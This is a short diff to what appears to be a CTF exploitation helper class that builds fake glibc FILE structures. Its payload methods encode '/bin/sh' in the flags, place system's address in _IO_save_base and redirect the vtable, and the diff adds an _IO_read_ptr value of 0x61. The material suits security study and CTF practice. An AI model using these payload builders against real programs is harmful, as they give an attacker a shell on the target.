@@ -126,6 +126,7 @@ class IO_FILE_plus_struct(FileStructure):
             bytes: payload.
         """
         self.flags = 0x68732f6e69622f
+        self._IO_read_ptr = 0x61
         self._IO_save_base = system_addr
         self._lock = lock_addr
         self.vtable = stdout_store_addr + 0x10
@@ -148,6 +149,7 @@ class IO_FILE_plus_struct(FileStructure):
         """
         assert context.bits == 64, "only support amd64!"
         self.flags &= ~1
+        self._IO_read_ptr = 0x61
         self.unknown2 = 0
         self._IO_write_base = 0
         self._IO_write_ptr = 0x1
